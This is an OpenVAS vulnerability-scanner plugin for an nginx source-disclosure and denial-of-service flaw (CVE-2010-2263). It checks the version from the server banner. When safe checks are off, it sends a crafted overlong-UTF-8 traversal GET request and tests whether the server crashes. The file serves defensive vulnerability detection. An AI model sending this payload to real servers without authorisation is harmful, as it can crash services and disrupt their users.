###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nginx_40760.nasl 14 2013-10-27 12:33:37Z jan $
#
# nginx Remote Source Code Disclosure and Denial of Service Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "nginx is prone to remote source-code-disclosure and denial of service
vulnerabilities.

An attacker can exploit these vulnerabilities to view the source code
of files in the context of the server process or cause denial-of-
service conditions.

nginx 0.8.36 for Windows is vulnerable; other versions may also
be affected.";


if (description)
{
 script_id(100676);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-06-14 14:19:59 +0200 (Mon, 14 Jun 2010)");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_cve_id("CVE-2010-2263");
 script_bugtraq_id(40760);

 script_name("nginx Remote Source Code Disclosure and Denial of Service Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/40760");
 script_xref(name : "URL" , value : "http://nginx.org/");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if nginx is prone to denial of service vulnerability");
 script_category(ACT_ATTACK);
 script_family("Denial of Service");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl","os_fingerprint.nasl","nginx_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("nginx/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:8000);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if(!banner || "nginx" >!< banner)exit(0);

if(safe_checks()) {

  if (host_runs("windows") == "no") exit(0);

  version = eregmatch(pattern:"nginx/([0-9.]+)", string:banner);
  if(isnull(version[1]))exit(0);

  if(version_is_equal(version: version[1], test_version:"0.8.36")) {
    security_warning(port:port);
    exit(0); 
  }  


} else {

  if(http_is_dead(port:port))exit(0);

  req = string("GET /%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%20 HTTP/1.1\r\nHost: ",get_host_name(),"\r\n\r\n");

  soc = http_open_socket(port);
  if(!soc)exit(0);

  send(socket: soc, data: req);

  if(http_is_dead(port:port)) {
    security_warning(port:port);
    exit(0);
  }  
  http_close_socket(soc);
}  

exit(0);
